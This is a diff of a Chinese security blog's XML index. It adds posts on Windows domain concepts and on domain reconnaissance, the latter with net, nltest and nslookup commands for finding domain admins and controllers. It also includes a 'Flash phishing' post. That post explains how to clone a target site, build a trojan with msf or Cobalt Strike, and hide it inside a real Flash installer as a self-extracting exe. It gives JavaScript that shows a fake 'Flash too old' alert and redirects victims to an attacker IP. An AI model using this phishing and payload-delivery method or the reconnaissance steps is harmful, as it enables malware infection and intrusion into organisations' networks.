@@ -4,17 +4,73 @@
   
     
     <entry>
-      <title>Flash 钓鱼</title>
-      <link href="/2021/08/30/Flash%E9%92%93%E9%B1%BC/"/>
-      <url>/2021/08/30/Flash%E9%92%93%E9%B1%BC/</url>
+      <title>域控-信息收集</title>
+      <link href="/2021/09/16/%E5%9F%9F%E6%8E%A7-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2021/09/16/%E5%9F%9F%E6%8E%A7-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
       
-        <content type="html"><![CDATA[<blockquote><p>水一篇☔️</p></blockquote><ol><li><p>安装完整页面爬取工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali</span><br><span class="line">apt-get install httrack</span><br><span class="line"># yum install httrack –y</span><br></pre></td></tr></table></figure></li><li><p>运行httrack，爬取需要爬取的页面，按提示填写</p></li><li><p>去比对官网页面修改不一样的地方，使首页和目标一样</p></li><li><p>下载flash正常exe，生成相应木马如msf/cs等</p></li><li><p>制作合成木马</p><ol><li>将两个木马放在同一个目录下</li><li>填写以exe结尾的文件名<img src="https://i.loli.net/2021/09/15/hADgpQo9v7EKmMT.png" alt="image.png"></li><li>点高级，进入自解压，填写解压绝对路径<img src="https://i.loli.net/2021/09/15/YdJI7hpLWfSm9NA.png" alt="image.png"></li><li>填写解压后的两个文件名<img src="https://i.loli.net/2021/09/15/OxdQ2IPTsuaDX1f.png" alt="image.png"></li><li>选择全部隐藏<img src="https://i.loli.net/2021/09/15/P7zt4fgok8KEIqh.png" alt="image.png"></li><li><img src="https://i.loli.net/2021/09/15/PICgvRpkDLZ6BU1.png" alt="image.png"><h3 id="flash结合xss"><a href="#flash结合xss" class="headerlink" title="flash结合xss"></a>flash结合xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;</span><br><span class="line">var iframe = document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">iframe.style.display=&quot;none&quot;;</span><br><span class="line">iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[0].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class="line">window.location.href=&quot;http://192.168.0.110&quot;;</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
+        <content type="html"><![CDATA[<h2 id="判断域"><a href="#判断域" class="headerlink" title="判断域"></a>判断域</h2><p><strong>命令汇总：</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 查询域列表</span><br><span class="line">net time/domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器</span><br><span class="line">net localgroup administrators 本机管理员【通常含有域用户】</span><br><span class="line">net user /domain 查询域用户(当前域)</span><br><span class="line">net <span class="built_in">group</span> /domain 查询域工作组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain 查看加入域的所有计算机名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain 查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain 查看域管理员</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain 查看域控</span><br><span class="line">net accounts /domain 查看域密码策略</span><br></pre></td></tr></table></figure><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><ul><li><p>通常域内主机 DNS 地址就是域控地址</p></li><li><p>查看是否开启 53(DNS)，88(kerberos)，389(LDAP) 等端口</p></li><li><p>ping 域控计算机名</p></li><li><p>利用nbtscan扫描识别，标注SHARING DC即为域控</p></li><li><p>域控计算机名可以通过3389信息，如用户切换时的提示查看</p></li><li><p>还可以通过smb嗅探</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:ak 查看域控制器的机器名</span><br><span class="line">Nslookup <span class="literal">-type</span>=SRV_ldap._tcp 查看域控制器的主机名</span><br><span class="line">net time /domain 查看当前时间，还可以看主域控</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组</span><br><span class="line">netdom query pdc 查看域的主域控制器</span><br></pre></td></tr></table></figure><p>如果获得是一台不在域内的机器，可以通过端口扫描探测，开放389端口的机器，如果DC和DNS在同一个服务器也会开放53端口。<br><img src="https://i.loli.net/2021/09/16/wBqtOdP3TQRm6Ck.png" alt="image.png"></p><h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><p>在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限；定位域内管理员的常规渠道，一是日志，二是会话。<br>常见域管理员定位工具：</p></li><li><p>psloggedon.exe</p></li><li><p>PVEFindADUser.exe</p></li><li><p>netview.exe</p></li><li><p>Nmap的NSE脚本</p></li><li><p>PowerView脚本</p></li><li><p>Empire的user_hunter模块</p></li></ul><p>简单方法：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain admins&quot;</span> /domain 查询域管理员用户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise admins&quot;</span> /domain 查询管理员用户组</span><br></pre></td></tr></table></figure><h2 id="非域信息收集"><a href="#非域信息收集" class="headerlink" title="非域信息收集"></a>非域信息收集</h2><p>信息收集包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p><ul><li>查询网络配置信息</li><li>查询操作系统及软件信息</li><li>查询本机服务信息</li></ul>]]></content>
       
+      
+      <categories>
+          
+          <category> 域 </category>
+          
+      </categories>
       
       
         <tags>
             
-            <tag> kali </tag>
+            <tag> 域控,域,信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>域控-概念</title>
+      <link href="/2021/09/16/%E5%9F%9F%E6%8E%A7-%E6%A6%82%E5%BF%B5/"/>
+      <url>/2021/09/16/%E5%9F%9F%E6%8E%A7-%E6%A6%82%E5%BF%B5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><h2 id="域是什么"><a href="#域是什么" class="headerlink" title="域是什么"></a><strong>域是什么</strong></h2><blockquote><p>相关概念参考自“百度百科”</p></blockquote><p>在介绍windows的域之前，先说下<strong>工作组</strong>的概念。工作组是最常用最简单最普遍的资源管理模式。简单是因为默认情况下计算机都是采用工作组方式进行资源管理的。默认情况下我们个人所使用的电脑大部分都处在名为workgroup的工作组中（也就是说工作组中的每一台计算机在网络中地位平等，是独立管理的个体），工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。也就是我们常在“网上邻居”看到的场景。<br>大多数人都使用过“网上邻居”做资源共享，但是这种工作组的形式，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制（比如无法给所有机器统一发放补丁等）。基于以上缺点，当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式，工作组的组织形式就不适合了，于是域就出现了。<br><strong>域</strong>是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。<br>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。 如果企业网络中计算机和用户数量较多时，要实现高效管理，就需要windows域。</p><h2 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h2><p><strong>活动目录（Active Directory）</strong>是由组织单元、域（domain）、域树（tree）、域森林（forest）构成的层次结构。<strong>域</strong>作为最基本的管理单元，同时也是最基层的容器。AD可以对域中所有的对象（用户，计算机，组……）等基本数据进行存储，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式,在一个活动目录中可以根据需要建立多个域.活动目录这种层次结构使企业网络具有极强的扩展性，便于组织、管理以及目录定位。</p><h2 id="域控（DC）"><a href="#域控（DC）" class="headerlink" title="域控（DC）"></a>域控（DC）</h2><p><strong>域控制器（Domain Control）</strong>在域架构中用来管理所有客户端的服务器，是域架构的核心，每个域控制器上都包含了AD活动目录数据库,即安装了AD的服务器就是域控DC。一般内网中存在多个域控，且域控之间可以自动同步信息，从而确保域的安全运行。</p><h2 id="域管"><a href="#域管" class="headerlink" title="域管"></a>域管</h2><p>域管理员是具有管理权限的域用户，它可以在域控中对在域主机进行统一控制。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 域 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 域控,域,概念 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Flash 钓鱼</title>
+      <link href="/2021/09/15/Flash%E9%92%93%E9%B1%BC/"/>
+      <url>/2021/09/15/Flash%E9%92%93%E9%B1%BC/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>水一篇☔️</p></blockquote><ol><li><p>安装完整页面爬取工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali</span><br><span class="line">apt-get install httrack</span><br><span class="line"># yum install httrack –y</span><br></pre></td></tr></table></figure></li><li><p>运行httrack，爬取需要爬取的页面，按提示填写</p></li><li><p>去比对官网页面修改不一样的地方，使首页和目标一样</p></li><li><p>下载flash正常exe，生成相应木马如msf/cs等</p></li><li><p>制作合成木马</p><ol><li>将两个木马放在同一个目录下</li><li>填写以exe结尾的文件名<img src="https://i.loli.net/2021/09/15/hADgpQo9v7EKmMT.png" alt="image.png"></li><li>点高级，进入自解压，填写解压绝对路径<img src="https://i.loli.net/2021/09/15/YdJI7hpLWfSm9NA.png" alt="image.png"></li><li>填写解压后的两个文件名<img src="https://i.loli.net/2021/09/15/OxdQ2IPTsuaDX1f.png" alt="image.png"></li><li>选择全部隐藏<img src="https://i.loli.net/2021/09/15/P7zt4fgok8KEIqh.png" alt="image.png"></li><li><img src="https://i.loli.net/2021/09/15/PICgvRpkDLZ6BU1.png" alt="image.png"><h3 id="flash结合xss"><a href="#flash结合xss" class="headerlink" title="flash结合xss"></a>flash结合xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;</span><br><span class="line">var iframe = document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">iframe.style.display=&quot;none&quot;;</span><br><span class="line">iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[0].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class="line">window.location.href=&quot;http://192.168.0.110&quot;;</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 钓鱼 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 钓鱼,flash </tag>
             
         </tags>
       
